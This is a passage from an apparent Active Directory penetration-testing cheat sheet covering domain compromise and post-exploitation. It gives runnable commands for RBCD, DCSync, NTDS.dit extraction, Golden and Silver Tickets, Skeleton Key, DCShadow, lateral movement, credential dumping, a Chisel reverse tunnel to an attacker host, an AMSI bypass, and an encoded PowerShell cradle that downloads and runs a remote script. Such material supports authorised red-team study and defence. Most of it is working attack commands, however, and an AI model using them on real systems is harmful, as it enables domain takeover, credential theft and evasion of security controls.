(Attack Flow 2 - RBCD)

1. Confirm your account has GenericWrite on the target computer
2. Create a new machine account or obtain an existing machine account hash
3. Modify msDS-AllowedToActOnBehalfOf attribute on target computer
4. Request Administrator ticket using Rubeus s4u
5. Gain admin access to target computer

(Attack 2 - Resource-Based Constrained Delegation (RBCD))

# Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
# PowerView + Impacket
Set-DomainObject -Identity [target-computer] -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe s4u /user:[our-machine$] /rc4:[machine-hash] /impersonateuser:administrator /msdsspn:cifs/[target] /ptt
```

### [Phase 4: Domain Compromise]

The goal of Phase 4 is to fully take over the DC after obtaining Domain Admin or equivalent privileges.

### [4-1: DCSync Attack]

DCSync Attack has the attacker impersonate a fake DC and send replication requests to the real DC. This allows extraction of all domain account hashes (including NTLM and Kerberos keys) without physical DC access.

**Requirements:**

```bash
1. Must have an account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
2. Typically held by Domain Admin, Enterprise Admin, and Domain Controllers groups
3. Use BloodHound query "Find Principals with DCSync Rights" to find non-standard accounts with these rights
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain DA account or account with DCSync rights
2. Pose as a fake DC and send replication request to the real DC (DRSUAPI GetNCChanges)
3. DC treats it as a normal replication request and returns hashes
4. Obtain all account NTLM hashes + Kerberos keys
5. krbtgt hash → create Golden Ticket
6. Administrator hash → Pass-the-Hash

--------------------------------------------------------------------

(Run Attack)

# Mimikatz (Windows, requires DA privileges)
1. Run mimikatz.exe
2. privilege::debug  (elevate privileges)

3-1. lsadump::dcsync /user:Administrator
     → dump only the Administrator account hash

3-2. lsadump::dcsync /domain:domain.local /all /csv
     → dump all domain account hashes in CSV format

# secretsdump.py (Kali, with credentials)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-ntlm

# secretsdump.py (with hash)
secretsdump.py -hashes :[NTLM-hash] domain.local/[user]@[DC-IP] -just-dc-ntlm
```

### [4-2: NTDS.dit Dump]

Directly extract the Active Directory database file (NTDS.dit) from the DC to obtain all hashes.

※ The SYSTEM registry hive (which contains the decryption key) is also required.

**Requirements:**

```bash
1. Direct access to the DC (local or remote)
2. DA privileges or Backup Operators membership
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

Access DC with DA privileges (Evil-WinRM, psexec, etc.)
  → Create a Volume Shadow Copy (to copy locked files that are in use)
  → Copy NTDS.dit + SYSTEM hive from the shadow copy
  → Transfer files to Kali
  → Extract hashes offline with secretsdump.py
  → Obtain all domain account hashes

-----------------------------------------------------------------

(Run Attack)

# Volume Shadow Copy method (Windows)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
reg save HKLM\SYSTEM C:\SYSTEM

# Extract from Kali
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# impacket ntdsutil
ntdsutil.py [user]@[DC-IP] -hashes :[hash]
```

### [4-3: Golden Ticket Attack]

Forges a TGT (Ticket Granting Ticket) using the NTLM hash of the krbtgt account. The forged TGT grants access to anything in the domain, can be set to expire in 10 years, and persists even after password changes (requires resetting the krbtgt password twice to invalidate).

**Requirements:**

```bash
1. Must have the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit)
2. Must have the domain SID
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain krbtgt hash via DCSync or NTDS.dit
2. Get domain SID (whoami /user or Get-DomainSID)
3. Forge TGT with Mimikatz / Rubeus
   (any username works, even non-existent accounts)
4. Inject the forged ticket into memory (/ptt)
5. Access any service in the domain
6. Remains valid even after password changes until krbtgt is reset twice

--------------------------------------------------------------------------------

(Gather Required Info)

# Get domain SID
whoami /user  # S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-[RID]
# or
Get-DomainSID  # PowerView

# Get krbtgt hash (DCSync)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-user krbtgt

------------------------------------------------------------------------------------

(Create and Use Golden Ticket)

# Mimikatz
1. Run mimikatz.exe
2. kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /krbtgt:[krbtgt-hash] /ptt
   ※ /user: doesn't have to be real — /user:FakeAdmin works even for non-existent accounts
   ※ Only the signature needs to match, so any username passes

# Rubeus
.\Rubeus.exe golden /rc4:[krbtgt-hash] /domain:domain.local /sid:S-1-5-21-XXXXXXX /user:FakeAdmin /ptt

# Verify access after injection
dir \\DC\C$
psexec.exe \\DC cmd.exe
```

### [4-4: Silver Ticket Attack]

Forges a TGS (Ticket Granting Service) ticket using a service account hash. Unlike Golden Ticket, it does not communicate with the DC — making detection harder, but access is limited to the targeted service only.

**Requirements:**

```bash
1. Must have the service account's NTLM hash
2. Must know the target service's SPN
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain service account hash (from Kerberoast crack or Mimikatz)
2. Identify the target service's SPN (e.g., cifs/fileserver.domain.local)
3. Forge TGS with Mimikatz (generated locally without contacting DC)
4. Inject forged ticket (/ptt)
5. Access only that specific service (narrower scope than Golden, but harder to detect)

---------------------------------------------------------------------------

(Run Attack)

# Mimikatz
1. Run mimikatz.exe
2. kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /target:[service-host] /service:cifs /rc4:[service-account-hash] /ptt

# Verify access
dir \\[target]\C$
```

### [4-5: Skeleton Key Attack]

Injects a master password into the DC's LSASS process, allowing authentication as any domain account using the password "Mimikatz" while keeping the original password valid.

※ Disappears on reboot.

**Requirements:**

```bash
1. Must have DA access to the DC
2. Must be able to bypass AV/EDR
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access DC with DA privileges
2. Upload Mimikatz to the DC
3. Run privilege::debug → misc::skeleton
4. "Mimikatz" master password injected into LSASS
5. All domain accounts can now authenticate with password "Mimikatz"
6. Original passwords still work in parallel
7. Disappears on reboot (not persistent)

------------------------------------------------------------------

(Run Attack)

# Mimikatz (run on DC)
1. Run mimikatz.exe
2. privilege::debug  (elevate privileges)
3. misc::skeleton    (inject Skeleton Key)

# Any account can now authenticate with "Mimikatz" as the password
net use \\DC\C$ /user:Administrator Mimikatz
```

### [4-6: DCShadow]

Registers a fake DC in AD and force-pushes malicious changes (new accounts, permission changes, etc.) into the real AD.

※ Bypasses existing audit logs.

**Requirements:**

```bash
1. Must have DA privileges
2. Two separate Mimikatz instances required
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access machine with DA privileges
2. Mimikatz instance 1: register fake DC (lsadump::dcshadow)
3. Mimikatz instance 2: prepare changes to push
   (e.g., grant DA rights to a specific user, create a backdoor account)
4. Use /push to force-replicate changes into the real AD
5. Appears as normal DC replication in existing audit logs
6. Extremely difficult to detect

--------------------------------------------------------------------------

(Run Attack)

Terminal 1 - (Start fake DC)
1. Run mimikatz.exe
2. !+
3. !processtoken
4. lsadump::dcshadow
→ Register fake DC and wait

Terminal 2 - (Push changes)
1. Run mimikatz.exe
2. lsadump::dcshadow /object:targetuser /attribute:description /value:"hacked"
   → Prepare the changes
3. lsadump::dcshadow /push
   → Force-replicate into AD

-------------------------------------------------------------------------------

(Verify)

# Check via PowerShell
Get-ADUser targetuser -Properties description
→ Verify description changed to "hacked"

# Verify DA group membership
Get-ADGroupMember "Domain Admins"
→ Verify targetuser was added
```

### [Phase 5: Post-Exploitation & Persistence]

The goal of Phase 5 is to maintain access and move to target systems after taking over the DC.

### [5-1: Lateral Movement]

```bash
# psexec.py - remote command execution via SMB
psexec.py domain.local/Administrator:[pass]@[IP]
psexec.py -hashes :[hash] domain.local/Administrator@[IP]

# wmiexec.py - remote command execution via WMI (stealthier)
wmiexec.py domain.local/Administrator:[pass]@[IP]

# smbexec.py - execution via SMB
smbexec.py domain.local/Administrator:[pass]@[IP]

# Evil-WinRM - PowerShell remoting via WinRM (port 5985)
evil-winrm -i [IP] -u Administrator -p [pass]
evil-winrm -i [IP] -u Administrator -H [hash]

# RDP
xfreerdp /v:[IP] /u:Administrator /p:[pass] +clipboard /dynamic-resolution
```

### [5-2: Credential Dumping]

```bash
# Mimikatz - LSASS memory dump
1. Run mimikatz.exe
2. privilege::debug
3-1. sekurlsa::logonpasswords  → plaintext passwords + hashes
3-2. lsadump::sam              → SAM database local account hashes
3-3. lsadump::lsa /patch       → LSA Secrets cached credentials

# CrackMapExec
crackmapexec smb [IP] -u [user] -p [pass] --lsa   → dump LSA Secrets
crackmapexec smb [IP] -u [user] -p [pass] --ntds  → dump DC NTDS.dit

# secretsdump.py
secretsdump.py domain.local/[user]:[pass]@[IP]    → dump SAM + LSA + NTDS all at once
```

### [5-3: Network Pivoting]

```bash
# Configure proxychains
# Add to /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# SSH tunnel (SOCKS5 proxy)
ssh -D 1080 -f -N user@[jump-host]

# Chisel tunnel
# Server (attacker)
chisel server --port 8080 --reverse

# Client (victim)
chisel client [ATTACKER-IP]:8080 R:socks

# Access internal network via proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
```

### [5-4: AV / EDR Bypass Basics]

```bash
# AMSI Bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution Policy bypass
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1

# Base64 encoding
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://[IP]/script.ps1')"))
powershell -enc $enc
```
